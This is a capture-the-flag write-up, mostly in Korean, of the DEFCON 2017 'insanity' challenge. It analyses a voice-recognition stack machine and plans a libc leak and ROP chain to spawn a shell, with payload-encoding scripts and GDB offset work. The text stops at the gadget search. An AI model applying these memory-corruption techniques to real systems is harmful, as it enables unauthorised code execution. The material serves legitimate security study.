---
title: "Potent Pwnables) insanity"
sidebar_position: 1
---
## **Information**

### **Description**
```
Are you a chicken?

insanity\_thereisnorightandwrongtheresonlyfunandboring.quals.shallweplayaga.me:18888

Files <https://2017.notmalware.ru/90ac48d8e27c81628dd56a6e3926a18cd6a399c3/insanity.tar.bz2>
```
### **File**

* [insanity.tar.bz2](/attachments/1147561/1147560.bz2)

### **Source Code**

## **Writeup**

### File information

```bash title="File information"
lazenca0x0@ubuntu:~/CTF/DEFCON2017/insanity$ file insanity
insanity: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=6ea3c95d733e8a74075300acbba43d54a23b56c3, stripped
lazenca0x0@ubuntu:~/CTF/DEFCON2017/insanity$ checksec.sh --file insanity
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   insanity
lazenca0x0@ubuntu:~/CTF/DEFCON2017/insanity$
```

### **Binary analysis**

#### **Main(voice command system)**
* 해당 함수는 다음과 같은 기능을 합니다.
  + 해당 프로그램에서 pocketsphinx, SphinxBase, zlib 라이브러리를 사용하고 있습니다.
  - 해당 라이브러리 들은 음성 data를 Text로 변환해주는 라이브러리 입니다.+ CMDs.cmdList[0]영역에 CMDs 주소 값과 0x8000000000000000을 OR 연산한 값을 저장합니다.
  + 해당 프로그램은 사용자로 부터 입력받을 data의 크기 값을 입력받습니다.(read() 함수이용)
    - 해당 값은 65536 를 넘을 수 없습니다.
  + 그리고 read()함수를 이용해 사용자로 부터 음성 Data를 입력 받습니다.
    - 음성 data는zlib라이브러리를 이용해 압축을 해제합니다.
    - 압축 해제 된 음성 데이터는 \_mm\_xor\_si128() 함수에 의해 xor 연산이 진행됩니다.
      * xor연산시 8bit씩 진행되며, xor연산에 사용되는 키는 0x80 입니다.
    - 복호화 된 음성 데이터를 samples\_8bit, samples\_16bit 에 저장됩니다.
    - 즉, 전달되는 음성 data는 0x80을 이용해 xor 연산이 되어 있어야 하며, zlib 라이브러리를 이용해 압축되어 있어야 합니다.
  + 가공된 음성 data는 ps\_get\_hyp() 함수에 의해 text로 변경된 값을 return 합니다.
    - return 된 문자열에서 "insanity" 단어의 갯수를 계산합니다.
    - 그리고 "insane" 단어가 나타나면 "insanity" 단어 갯수를 CMDs.cmdList[] 에 저장합니다.

```c title="main"
signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
...

  v71 = *MK_FP(__FS__, 40LL);
  keyPattern[0] = -9223231297218904064LL;
  keyPattern[0] = -9223231297218904064LL;
  ytinasni = 'ytinasni';
  v68 = 0;
  signal(14, handler);
  alarm(0x1Eu);
  setbuf(stdout, 0LL);
  memset(&CMDs, 0, sizeof(CMDs));
  err_set_logfp(0LL, 0LL);
  v3 = ps_args(0LL);
  config = cmd_ln_init(
             0LL,
             v3,
             1LL,
             "-hmm",
             "./model/en-us",
             "-lm",
             "./model/en-us.lm.bin",
             "-dict",
             "./model/cmudict-en-us.dict",
             0LL);
  if ( config )
  {
    decoder = ps_init(config);
    if ( decoder )
    {
      cmdMaxCount = 2;
      CMDs.cmdList[0] = (unsigned __int64)&CMDs | 0x8000000000000000LL;
      while ( 1 )
      {
LABEL_4:
        alarm(0x1Eu);
        len = read(0, &score, 4uLL);
        if ( len <= 0 )
          goto LABEL_20;
        if ( !score )
          break;
        ps_start_utt(decoder, &score);
        write(1, ".", 1uLL);
        memset(&stream, 0, sizeof(stream));
        ret = inflateInit_(&stream, "1.2.8", 112LL);
        if ( ret )
          goto LABEL_20;
LABEL_7:
        v8 = score;
        if ( score )
        {
          if ( ret != 1 )
          {
            if ( score >= 0x10001 )
              v8 = 0x10000;
            count = 0;
            while ( 1 )
            {
              v10 = read(0, &input_buf[count], v8 - count);
              if ( !v10 )
                break;
              count += v10;
              if ( v8 <= count )
              {
                score -= v8;
                stream.avail_in = v8;
                stream.next_in = input_buf;
                while ( 1 )
                {
                  stream.avail_out = 0x10000;
                  stream.next_out = &data8bit;
                  v18 = inflate(&stream, 0LL);
                  ret = v18;
                  if ( (unsigned int)(v18 + 4) <= 6 )
                  {
                    if ( (1LL << ((unsigned __int8)v18 + 4)) & 0x47 )
                      goto LABEL_20;
                  }
                  length = 0x10000LL - stream.avail_out;
                  pLoad = (__m128i *)&data8bit;
                  pStore = (__m128i *)&data16bit;
                  block = ((0x10000 - (unsigned __int64)stream.avail_out) >> 5) + 1;
                  key = _mm_stream_load_si128((__m128i *)keyPattern);
                  do
                  {
                    x0 = _mm_stream_load_si128(pLoad);
                    x1 = _mm_stream_load_si128(pLoad + 1);
                    _mm_stream_si128(pStore, _mm_xor_si128(_mm_unpacklo_epi8(0LL, x0), key));
                    _mm_stream_si128(pStore + 1, _mm_xor_si128(_mm_unpackhi_epi8(0LL, x0), key));
                    _mm_stream_si128(pStore + 2, _mm_xor_si128(_mm_unpacklo_epi8(0LL, x1), key));
                    _mm_stream_si128(pStore + 3, _mm_xor_si128(_mm_unpackhi_epi8(0LL, x1), key));
                    pStore += 4;
                    pLoad += 2;
                    --block;
                  }
                  while ( block );
                  alarm(0x1Eu);
                  ps_process_raw(decoder, &data16bit, length, 0LL, 0LL);
                  if ( stream.avail_out )
                    goto LABEL_7;
                }
              }
            }
          }
          goto LABEL_20;
        }
        if ( ret != 1 )
          goto LABEL_20;
        command = 0;
        count_1 = 0;
        ps_end_utt(decoder);
        hypString = (const char *)ps_get_hyp(decoder, &v61);
        while ( hypString[count_1] && (unsigned int)(cmdMaxCount - 2) <= 0x3E8 )
        {
          if ( !memcmp(&hypString[count_1], "insanity ", 9uLL) )
          {
            ++command;
            count_1 += 9;
          }
          else
          {
            if ( memcmp(&hypString[count_1], "insane", 7uLL) )
              goto LABEL_4;
            tmp = command;
            count_1 += 7;
            command = 0;
            CMDs.cmdList[cmdMaxCount++] = tmp;
          }
        }
      }
      v23 = len;
      write(1, "\n", 1uLL);
```

#### **Main(Processing function)**

* 해당 영역의 코드는 다음과 같은 기능을 합니다.
  + CMDs.cmdList[] 에서 저장된 command 번호를 불러옵니다.
  + command는 9 보다 클수는 없습니다.
* 해당 프로그램에서 지원하는 기능은 다음과 같습니다.
  + 여기서 주의해야 할 부분은 CMDs[] 배열에 저장된 데이터를 가져오는 부분입니다.  
    - 연산을 할 때 사용되는 데이터를 가져올 때는 cmdMaxCount에 저장된 값을 사용하고 있습니다.
    - 프로그램의 코드를 가져올 때는 codeCount의 값을 사용하고 있습니다.

**Explain function.**

| Command number | Function | Explain |
| --- | --- | --- |
| 1 |  | "insanity" 단어를 스택에 저장합니다. |
| 2 | Add | CMDs.cmdList[]에서 2개의 값(cmdMaxCount, cmdMaxCount -1)을 가져와 덧셈한 값을 CMDs.cmdList[cmdMaxCount -1]에 저장합니다. |
| 3 | Sub | CMDs.cmdList[]에서 2개의 값(cmdMaxCount, cmdMaxCount -1)을 가져와 뺄셈한 값을 CMDs.cmdList[cmdMaxCount -1]에 저장합니다. |
| 4 | Mul | CMDs.cmdList[]에서 2개의 값(cmdMaxCount, cmdMaxCount -1)을 가져와 곱셈한 값을 CMDs.cmdList[cmdMaxCount -1]에 저장합니다. |
| 5 | Cmp | CMDs.cmdList[]에서 2개의 값(cmdMaxCount, cmdMaxCount -1)을 가져와 비교한 값을 CMDs.cmdList[cmdMaxCount -1]에 저장합니다. |
| 6 | load | CMDs.cmdList[]에서 값을 가져와 다음과 같이 동작 후 연산된 값을 저장합니다.   + CMDs.cmdList[++cmdMaxCount]에 저장된 값을 firstLoad에 저장합니다.   + CMDs.cmdList[firstLoad]에 저장된 값 secLoad에 저장합니다.   + secLoad 값을 0x7FFFFFFFFFFFFFFFLL 값과 AND 연산 합니다.   + 그리고 해당 값에 "8 \CMDs.cmdList[cmdMaxCount]"  연산된 값을 더합니다.   + 이렇게 연산된 된 값을 CMDs.cmdList[cmdMaxCount] 영역에 저장됩니다.   + 해당 기능을 이용해 임의의 영역에 저장된 값을 불러 올수 있습니다. |
| 7 | Store | CMDs.cmdList[]에서 2개의 값(cmdMaxCount, cmdMaxCount -1)을 가져와 storeDest, storeSrc에 저장됩니다.   + 해당 값은 CMDs.cmdList[storeDest] 영역에 storeSrc 가 저장됩니다.   + 해당 기능을 이용해 임의의 영역에 값을 덮어쓸수 있습니다.   + cmdMaxCount 에 저장된 값에 2를 뺀 값을 cmdMaxCount 저장합니다. |
| 8 | Jump | CMDs.cmdList[]에서 2개의 값(cmdMaxCount, cmdMaxCount -1)을 가져와 jump\_1, jump\_2에 저장됩니다. 해당 값 중 jump\_1는 다음과 같은 연산에 사용됩니다.   + "codeCount + jump\_1 - 1" 연산 결과 값은 tmp\_1에 저장됩니다. jump2에 값이 있다면 앞에서 연산된 값이 codeCount에 저장됩니다.   + 이로 인해 임의의 영역에 접근 할 수 있습니다. |
| default | Save | getCmd의 값이 1 ~ 8, 999과 같지 않으면 다음과 같이 동작합니다.    + CMDs.cmdList[++cmdMaxCount] = getCMD - 10;   + 해당 기능을 이용해 CMDs 배열에 값을 저장할 수 있습니다. |

```c title="Main - Processing function"
...
      write(1, "\n", 1uLL);
      v24 = cmdMaxCount;
      CMDs.cmdList[cmdMaxCount] = 0LL;
      CMDs.cmdList[1] = (unsigned __int64)&hypString[v23] | 0x8000000000000000LL;
      getCMD = CMDs.cmdList[2];
      if ( CMDs.cmdList[2] )
      {
        codeCount = 2;
        while ( 2 )
        {
          switch ( getCMD )
          {
            case 1LL:
              if ( cmdMaxCount == 999 )
                goto LABEL_76;
              CMDs.cmdList[++cmdMaxCount] = (unsigned __int64)&ytinasni | 0x8000000000000000LL;
              goto LABEL_36;
            case 2LL:
              target = cmdMaxCount - 1;
              add_1 = CMDs.cmdList[cmdMaxCount];
              add_2 = CMDs.cmdList[cmdMaxCount - 1];
              if ( (add_1 & add_2) < 0 )
              {
                v53 = (const char *)target;
                srcMEM = (char *)(add_1 & 0x7FFFFFFFFFFFFFFFLL);
                srcSTR = (char *)(add_2 & 0x7FFFFFFFFFFFFFFFLL);
                v56 = strlen(srcMEM) + 1;
                dest = malloc((signed int)(v56 - 1 + strlen((const char *)(add_2 & 0x7FFFFFFFFFFFFFFFLL)) + 1));
                memcpy(dest, srcMEM, v56 - 1);
                strcpy((char *)dest + v56 - 1, srcSTR);
                v58 = cmdMaxCount - 1;
                CMDs.cmdList[(_QWORD)v53] = (__int64)dest;
                if ( &ytinasni != (__int64 *)srcMEM )
                {
                  free(srcMEM);
                  v58 = cmdMaxCount - 1;
                }
                cmdMaxCount = v58;
                if ( srcSTR != (char *)&ytinasni )
                  free(srcSTR);
              }
              else
              {
                if ( add_2 < 0 || add_1 < 0 )
                {
                  puts("Invalid add\n");
                  _exit(0);
                }
                --cmdMaxCount;
                CMDs.cmdList[target] = add_1 + add_2;
              }
              goto LABEL_36;
            case 3LL:
              target = cmdMaxCount - 1;
              subtract_1 = CMDs.cmdList[cmdMaxCount];
              subtract_2 = CMDs.cmdList[cmdMaxCount - 1];
              if ( subtract_2 < 0 || subtract_1 < 0 )
              {
                puts("Invalid subtract\n");
                _exit(0);
              }
              --cmdMaxCount;
              CMDs.cmdList[target] = subtract_2 - subtract_1;
              goto LABEL_36;
            case 4LL:
              target = cmdMaxCount - 1;
              mul_1 = CMDs.cmdList[cmdMaxCount];
              mul_2 = CMDs.cmdList[cmdMaxCount - 1];
              if ( mul_2 < 0 || mul_1 < 0 )
              {
                puts("Invalid multiply\n");
                _exit(0);
              }
              --cmdMaxCount;
              CMDs.cmdList[target] = mul_2 * mul_1;
              goto LABEL_36;
            case 5LL:
              target = cmdMaxCount - 1;
              compare_1 = CMDs.cmdList[cmdMaxCount];
              compare_2 = CMDs.cmdList[cmdMaxCount - 1];
              if ( (compare_1 & compare_2) < 0 )
              {
                v51 = strcmp(
                        (const char *)(compare_1 & 0x7FFFFFFFFFFFFFFFLL),
                        (const char *)(compare_2 & 0x7FFFFFFFFFFFFFFFLL));
                v52 = cmdMaxCount--;
                CMDs.cmdList[v52 - 2] = v51 == 0;
              }
              else
              {
                if ( compare_2 < 0 || compare_1 < 0 )
                {
                  puts("Invalid compare\n");
                  _exit(0);
                }
                --cmdMaxCount;
                CMDs.cmdList[target] = compare_1 == compare_2;
              }
              goto LABEL_36;
            case 6LL:
              firstLoad = CMDs.cmdList[++codeCount];
              if ( firstLoad > 1 || (secLoad = CMDs.cmdList[firstLoad], secLoad >= 0) )
              {
                puts("Invalid load\n");
                _exit(0);
              }
              CMDs.cmdList[cmdMaxCount] = *(_QWORD *)((secLoad & 0x7FFFFFFFFFFFFFFFLL) + 8 * CMDs.cmdList[cmdMaxCount]);
              goto LABEL_36;
            case 7LL:
              v35 = cmdMaxCount;
              cmdMaxCount -= 2;
              v36 = v35 - 1;
              storeDest = CMDs.cmdList[v35];
              storeSrc = CMDs.cmdList[v36];
              if ( storeDest < 0 )
              {
                puts("Invalid store\n");
                _exit(0);
              }
              CMDs.cmdList[storeDest] = storeSrc;
              goto LABEL_36;
            case 8LL:
              v41 = cmdMaxCount;
              cmdMaxCount -= 2;
              jump_1 = CMDs.cmdList[v41];
              jump_2 = CMDs.cmdList[(signed int)v41 - 1];
              if ( jump_2 < 0 || jump_1 < 0 )
              {
                puts("Invalid jump\n");
                _exit(0);
              }
              tmp_1 = codeCount + jump_1 - 1;
              if ( jump_2 )
                codeCount = tmp_1;
              goto LABEL_36;
            case 9LL:
              if ( cmdMaxCount == 999 )
                goto LABEL_76;
              v27 = (struct_v27 *)malloc(2uLL);
              v27->byte1 = 0;
              v27->byte0 = CMDs.cmdList[cmdMaxCount - 1];
              CMDs.cmdList[cmdMaxCount] = (unsigned __int64)v27 | 0x8000000000000000LL;
              goto LABEL_36;
            default:
              if ( cmdMaxCount == 999 )
                goto LABEL_76;
              CMDs.cmdList[++cmdMaxCount] = getCMD - 10;
LABEL_36:
              getCMD = CMDs.cmdList[++codeCount];
              if ( getCMD )
                continue;
              v24 = cmdMaxCount;
              break;
          }
          break;
        }
      }
      v28 = CMDs.cmdList[v24];
      if ( v28 >= 0 )
      {
        __printf_chk(1LL, "result: %lx\n", v28);
LABEL_20:
        result = 0LL;
        goto LABEL_21;
      }
      __printf_chk(1LL, "result: %s\n", v28 & 0x7FFFFFFFFFFFFFFFLL);
      result = 0LL;
    }
    else
    {
      fwrite("Failed to create recognizer, see log for details\n", 1uLL, 0x31uLL, stderr);
      result = 0xFFFFFFFFLL;
    }
  }
  else
  {
    fwrite("Failed to create config object, see log for details\n", 1uLL, 0x34uLL, stderr);
    result = 0xFFFFFFFFLL;
  }
LABEL_21:
  if ( *MK_FP(__FS__, 40LL) == v71 )
    return result;
LABEL_76:
  puts("Internal limitation\n");
  _exit(0);
  return result;
}
```

### Structure of Exploit code
:::note
* Jump 기능을 이용해 Fake code가 저장되어있는 영역으로 이동합니다.
  + Add, Mul 기능을 이용해 필요한 값을 계산합니다.
* Fake code를 이용해 Stack 영역을 Overwrite 합니다.  
  + system()
    - Save 기능을 이용해 Offset(libc addresss)을 저장합니다.
    - Load 기능을 이용해 libc addresss를 leak합니다.
      * CMDs.cmdList[0]영역에 저장된 값을 가져오기 위해 '0'을 추가합니다.
      * 즉, CMDs.cmdList[0]영역에 저장된 값 CMDs 주소 값에 Offset(libc addresss)을 더한 주소에 저장된 값을 CMDs.cmdList[]에 저장합니다.
    - Save 기능을 이용해 **Offset(system)**을 저장합니다.
    - Add 기능을 이용해 system() 함수의 주소를 계산합니다.
    - Save 기능을 이용해 Offset(ret + 2)을 저장합니다.
    - Store 기능을 이용해 ret 영역에 계산된 값을 저장합니다.
  + "/bin/sh"
    - Save 기능을 이용해 Offset(libc addresss)을 저장합니다.
    - Load 기능을 이용해 libc addresss를 leak합니다.  
      * system()부분에서 설명한 내용과 같이 구현 및 동작합니다.
    - Save 기능을 이용해 **Offset("/bin/sh")**을 저장합니다.
    - Add 기능을 이용해 "/bin/sh" 문자열의 주소를 계산합니다.
    - Save 기능을 이용해 Offset(ret + 1)을 저장합니다.
    - Store 기능을 이용해 ret 영역에 계산된 값을 저장합니다.
  + "POP RDI"
    - Save 기능을 이용해 Offset(libc addresss)을 저장합니다.
    - Load 기능을 이용해 libc addresss를 leak합니다.
      * system()부분에서 설명한 내용과 같이 구현 및 동작합니다.
    - Save 기능을 이용해 **Offset(POP RDI)**을 저장합니다.
    - Add 기능을 이용해 "POP RDI" 명령어의 주소를 계산합니다.
    - Save 기능을 이용해 Offset(ret + 2)을 저장합니다.
    - Store 기능을 이용해 ret 영역에 계산된 값을 저장합니다.
:::

* The following information is required for an attack:

:::note
* Voice Files
  + Create audio files
  + Encrypt audio file
* Space to store Fake code
* Leak libc addresss
* Offset
  + Ret
  + Area where fake code is stored
  + system
:::

### **Information for attack**

#### **Create a voice files**

* 음성 인식을 위한 Voice 파일을 생성하기 위해 Mac OS에서 지원하는 say 커맨드를 이용합니다.
* say에서 다음과 같이 사용 가능한 음성을 선택할 수 있습니다.
  + Alex, Fred, Victoria 는 en\_US를 지원하지만, 인식률이 좋지않았습니다.
  + 그래서 인식률이 좋은 Samantha를 사용합니다.

```sh title="List of available voices"
**********:Voices lazenca0x0$ say -v ?|grep en_US
Alex                en_US    # Most people recognize me by my voice.
Fred                en_US    # I sure like being inside this fancy computer
Samantha            en_US    # Hello, my name is Samantha. I am an American-English voice.
Victoria            en_US    # Isn't it nice to have a computer that will talk to you?
```

* 다음과 같은 script를 이용해 음성 파일을 생성합니다.
  + "insanity" 단어가 5개 이상 포함된 음성 파일을 생성할 때는 -r 옵션을 이용해 발음 속도를 조절 해야합니다.
  + 속도를 조절하지 않을 경우 생성되는 음성 파일의 크기가 해당 문제에서 허용하는 음성 데이터의 크기 보다 크게 됩니다.

```python title="Generate a voice file - CreateVoiceFiles.py"
import os
import sys

command = ''
for i in range(1,9):
    if(i < 5):
        command = "say -o insanity-16-" + str(i) + ".wav --data-format=LEI16@16000 -r 200 -v Samantha "+ "insanity "*i + "insane"
    else:
        command = "say -o insanity-16-" + str(i) + ".wav --data-format=LEI16@16000 -r 260 -v Samantha "+ "insanity "*i + "insane"

    os.system(command)
```

* 해당 script를 이용해 생성한 음성 데이터 입니다.

```sh title="Create a voice file - ls -al"
**********:Voices lazenca0x0$ ls -al
total 1440
drwxr-xr-x  12 JP11704  staff     408  5 18 18:57 .
drwx------+ 14 JP11704  staff     476  5 18 18:05 ..
-rw-r--r--@  1 JP11704  staff    6148  5 18 16:43 .DS_Store
-rw-r--r--   1 JP11704  staff   43848  5 18 18:57 insanity-16-1.wav
-rw-r--r--   1 JP11704  staff   60742  5 18 18:57 insanity-16-2.wav
-rw-r--r--   1 JP11704  staff   78706  5 18 18:57 insanity-16-3.wav
-rw-r--r--   1 JP11704  staff   96672  5 18 18:57 insanity-16-4.wav
-rw-r--r--   1 JP11704  staff   87474  5 18 18:57 insanity-16-5.wav
-rw-r--r--   1 JP11704  staff  100942  5 18 18:57 insanity-16-6.wav
-rw-r--r--   1 JP11704  staff  114410  5 18 18:57 insanity-16-7.wav
-rw-r--r--   1 JP11704  staff  127878  5 18 18:57 insanity-16-8.wav
-rw-r--r--@  1 JP11704  staff     365  5 18 18:57 script.py
**********:Voices lazenca0x0$
```

#### **Encrypt audio file**

* 다음과 같이 음성 데이터를 변환합니다.
  + 음성 데이터의 크기를 줄이기 위해 상위 bit만 가져와서 변환합니다.

```python title="Encrypt a voice file - EncryptVoiceFile.py"
def converter(filePath):
    datas = 0
    audioData = []

    with open(filePath) as f:
        f.read(0xe0) 
        while True:
            lBit8 = f.read(1)
            if not lBit8: 
                break
            
            hBit8 = f.read(1)
            if not hBit8:
                break
            hBit8_hex = ord(hBit8)

            audioData.append(chr(hBit8_hex^0x80))
            datas+=1

    log.info("File name : " + filePath + " " + str(hex(datas)))
    return ''.join(audioData)
```

#### **Space to store Fake code**

* 다음과 같은 Script를 이용해 Fake code를 저장할 공간을 확인할 수 있습니다.

```python title="Find a space to store fake code"
import os
import zlib
from pwn import *

HOST = "127.0.0.1"
PORT = 9001

gPOC = []

p = remote(HOST, PORT)

gPOC.append(p64(0x4141))
gPOC.append(p64(0x4242))
gPOC.append(p64(0x4343))
gPOC.append(p64(0x4444))

data = zlib.compress(''.join(gPOC))
sleep(20)
p.send(p32(len(data)))
p.send(data)

p.send(p32(0))
p.interactive()
```

* 해당 프로그램에 전달된 음성 Data는 sampel\_8bit 영역에 저장되어 있습니다.

```sh title="Find a space to store fake code - GDB" 
gdb-peda$ b *0x55b4c2947000 + 0x1180
Breakpoint 1 at 0x55b4c2948180
gdb-peda$ c
Breakpoint 1, 0x000055b4c2948180 in ?? ()
gdb-peda$ n
0x000055b4c2948188 in ?? ()
gdb-peda$ i r rsi
rsi            0x7ffd3c950160	0x7ffd3c950160
gdb-peda$ x/10gx 0x7ffd3c950160
0x7ffd3c950160:	0x0000000000004141	0x0000000000004242
0x7ffd3c950170:	0x0000000000004343	0x0000000000004444
0x7ffd3c950180:	0x0000000000000000	0x0000000000000000
0x7ffd3c950190:	0x0000000000000000	0x0000000000000000
0x7ffd3c9501a0:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* 하지만 음성 데이터가 포함되어 있지 않아 Error가 발생하고 프로그램이 종료됩니다.

```sh title="Segmentation fault"
gdb-peda$ c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
```

* 해당 문제를 해결하기 위해 "Fake code" 뒤에 음성데이터를 추가해서 전달 합니다.
  + 음성 데이터 추가되어 정상적으로 명령 Code가 추가되었습니다.

```sh title="Find a space to store fake code - GDB"
gdb-peda$ b *0x555df242e000 + 0x137f
Breakpoint 1 at 0x555df242f37f
gdb-peda$ c
Breakpoint 1, 0x0000555df242f37f in ?? ()
gdb-peda$ p/x $rsp+$rdx*8+0xe0
$1 = 0x7fffc7b7b298
gdb-peda$ x/4gx 0x7fffc7b7b298 - 0x18
0x7fffc7b7b280:	0x80007fffc7b7b280	0x0000000000000000
0x7fffc7b7b290:	0x0000000000000001	0x0000000000000000
gdb-peda$ x/20 0x7fffc7b7b280 + 0x21f40
0x7fffc7b9d1c0:	0x7974696e61736e69	0x0000000000000000
0x7fffc7b9d1d0:	0x0000000000004141	0x0000000000004242
0x7fffc7b9d1e0:	0x0000000000004343	0x0000000000004444
0x7fffc7b9d1f0:	0x8080808080808080	0x8080808080808080
0x7fffc7b9d200:	0x8080808080808080	0x8080808080808080
0x7fffc7b9d210:	0x8080808080808080	0x8080808080808080
0x7fffc7b9d220:	0x8080808080808080	0x8080808080808080
0x7fffc7b9d230:	0x8080808080808080	0x8080808080808080
0x7fffc7b9d240:	0x8080808080808080	0x8080808080808080
0x7fffc7b9d250:	0x8080808080808080	0x8080808080808080
gdb-peda$
```

#### **Offset(CMDS - sample\_8bit)**

* 다음과 같은 방법으로 offset 값을 얻을 수 있습니다.
  + 0x7fffc7b9d1c0(sample\_8bit) - 0x7fffc7b7b280(CMDS) = 0x21f40 / 8 = 0x43e8(17384)

#### **Offset(CMDS - ret)**

* 다음과 같은 방법으로 offset 값을 얻을 수 있습니다.  
  + 0x7fffc7bbd218(ret) - 0x7fffc7b7b280(CMDS) = 0x41f98 / 8 = 0x83f3(33779)

```bash title="Offset(CMDS - ret) - GDB" 
gdb-peda$ b *0x555df242e000 + 0x128e
Breakpoint 2 at 0x555df242f28e
gdb-peda$ c
Continuing.
gdb-peda$ i r rsp
rsp            0x7fffc7bbd218	0x7fffc7bbd218
gdb-peda$ p/x 0x7fffc7bbd218 - 0x7fffc7b7b280
$12 = 0x41f98
gdb-peda$ p/d 0x41f98 / 8
$13 = 33779
gdb-peda$ x/10gx 0x7fffc7bbd218
0x7fffc7bbd218:	0x00007fbcb9600830	0x0000000000000000
0x7fffc7bbd228:	0x00007fffc7bbd2f8	0x0000000100000000
0x7fffc7bbd238:	0x0000555df242eef0	0x0000000000000000
0x7fffc7bbd248:	0x8f47125c3d72d0f9	0x0000555df242f8e8
0x7fffc7bbd258:	0x00007fffc7bbd2f0	0x0000000000000000
gdb-peda$
```

#### **Leak libc addresss**

* 다음과 같은 방법으로 libc addresss를 얻을 수 있습니다.
  + ret 명령어 호출시 사용되는 rsp 영역에 libc addresss가 저장되어 있습니다.
  + 해당 주소를 Base addresss로 사용할 수 있습니다.

```bash title="Leak libc addresss - GDB" 
gdb-peda$ x/2gx 0x7fffc7bbd218
0x7fffc7bbd218:	0x00007fbcb9600830	0x0000000000000000
gdb-peda$ info proc map
process 4148
Mapped addresss spaces:
          Start Addr           End Addr       Size     Offset objfile
      0x555df242e000     0x555df2430000     0x2000        0x0 /home/lazenca0x0/CTF/DEFCON2017/insanity/insanity
      0x555df2630000     0x555df2631000     0x1000     0x2000 /home/lazenca0x0/CTF/DEFCON2017/insanity/insanity
      0x555df2631000     0x555df2632000     0x1000     0x3000 /home/lazenca0x0/CTF/DEFCON2017/insanity/insanity
      0x555df2a0b000     0x555df591c000  0x2f11000        0x0 [heap]
      0x7fbcb573a000     0x7fbcb5ae4000   0x3aa000        0x0 
      0x7fbcb5e8e000     0x7fbcb8b39000  0x2cab000        0x0 
      0x7fbcb8b39000     0x7fbcb8d1a000   0x1e1000        0x0 /home/lazenca0x0/CTF/DEFCON2017/insanity/model/en-us/sendump
      0x7fbcb8d1a000     0x7fbcb8de7000    0xcd000        0x0 
      0x7fbcb8de7000     0x7fbcb90ba000   0x2d3000        0x0 /home/lazenca0x0/CTF/DEFCON2017/insanity/model/en-us/mdef
      0x7fbcb90ba000     0x7fbcb90d2000    0x18000        0x0 /lib/x86_64-linux-gnu/libpthread-2.23.so
      0x7fbcb90d2000     0x7fbcb92d1000   0x1ff000    0x18000 /lib/x86_64-linux-gnu/libpthread-2.23.so
      0x7fbcb92d1000     0x7fbcb92d2000     0x1000    0x17000 /lib/x86_64-linux-gnu/libpthread-2.23.so
      0x7fbcb92d2000     0x7fbcb92d3000     0x1000    0x18000 /lib/x86_64-linux-gnu/libpthread-2.23.so
      0x7fbcb92d3000     0x7fbcb92d7000     0x4000        0x0 
      0x7fbcb92d7000     0x7fbcb93df000   0x108000        0x0 /lib/x86_64-linux-gnu/libm-2.23.so
      0x7fbcb93df000     0x7fbcb95de000   0x1ff000   0x108000 /lib/x86_64-linux-gnu/libm-2.23.so
      0x7fbcb95de000     0x7fbcb95df000     0x1000   0x107000 /lib/x86_64-linux-gnu/libm-2.23.so
      0x7fbcb95df000     0x7fbcb95e0000     0x1000   0x108000 /lib/x86_64-linux-gnu/libm-2.23.so
      0x7fbcb95e0000     0x7fbcb979f000   0x1bf000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7fbcb979f000     0x7fbcb999f000   0x200000   0x1bf000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7fbcb999f000     0x7fbcb99a3000     0x4000   0x1bf000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7fbcb99a3000     0x7fbcb99a5000     0x2000   0x1c3000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7fbcb99a5000     0x7fbcb99a9000     0x4000        0x0 
      0x7fbcb99a9000     0x7fbcb99c2000    0x19000        0x0 /lib/x86_64-linux-gnu/libz.so.1.2.8
...
gdb-peda$ p/x 0x00007fbcb9600830 -0x7fbcb95e0000
$14 = 0x20830
```

#### **Offset(Leak libc addresss- Base libc addresss)**

* 다음과 같은 방벙을 이용해 offset 값을 얻을 수 있습니다.

```bash title="Offset(Leak libc addresss- Base libc addresss)"
gdb-peda$ x/3i 0x00007fbcb9600830
   0x7fbcb9600830 <__libc_start_main+240>:	mov    edi,eax
   0x7fbcb9600832 <__libc_start_main+242>:	call   0x7fbcb961a030 <__GI_exit>
   0x7fbcb9600837 <__libc_start_main+247>:	xor    edx,edx
gdb-peda$ p/x 0x00007fbcb9600830 - 0x7fbcb95e0000
$22 = 0x20830
gdb-peda$ p/d 0x20830 / 8
$24 = 16646
```

#### **Offset("/bin/sh" addresss)**

* 다음과 같은 방벙을 이용해 offset 값을 얻을 수 있습니다.

```bash title="Offset(\"/bin/sh\" addresss) - GDB"
gdb-peda$ find "/bin/sh" libc
Searching for '/bin/sh' in: libc ranges
Found 1 results, display max 1 items:
libc : 0x7fbcb976c177 --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ p/x 0x7fbcb976c177 - 0x7fbcb95e0000
$2 = 0x18c177
```

#### **Offset(POP rdi)**

* RDI 레지스터에 "/bin/sh"를 저장하기 위해 "POP rdi" 가 필요합니다.

```bash title="Offset(POP rdi) - GDB"
gdb-peda$ info proc map
process 3204
Mapped addresss spaces:
          Start Addr           End Addr       Size     Offset objfile
...
      0x7f8485bce000     0x7f8485d8d000   0x1bf000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
...
gdb-peda$ ropsearch 'pop rdi;' libc
Searching for ROP gadget: 'pop rdi;' in: libc ranges
0x00007f8485cac800 : (b'5fc3')	pop rdi; ret
0x00007f8485d0b802 : (b'5fc3')	pop rdi; ret
0x00007f8485c00bef : (b'5fc3')	pop rdi; ret
0x00007f8485c97c02 : (b'5fc3')	pop rdi; ret
0x00007f8485ced87f : (b'5fc3')	pop rdi; ret
0x00007f8485ca8fda : (b'5fc3')	pop rdi; ret
0x00007f8485cdb01a : (b'5fc3')	pop rdi; ret
0x00007f8485bf601b : (b'5fc3')	pop rdi; ret
0x00007f8485c42825 : (b'5fc3')	pop rdi; ret
0x00007f8485c96026 : (b'5fc3')	pop rdi; ret
0x00007f8485ccf027 : (b'5fc3')	pop rdi; ret
0x00007f8485c56828 : (b'5fc3')	pop rdi; ret
0x00007f8485c97831 : (b'5fc3')	pop rdi; ret
0x00007f8485bf4835 : (b'5fc3')	pop rdi; ret
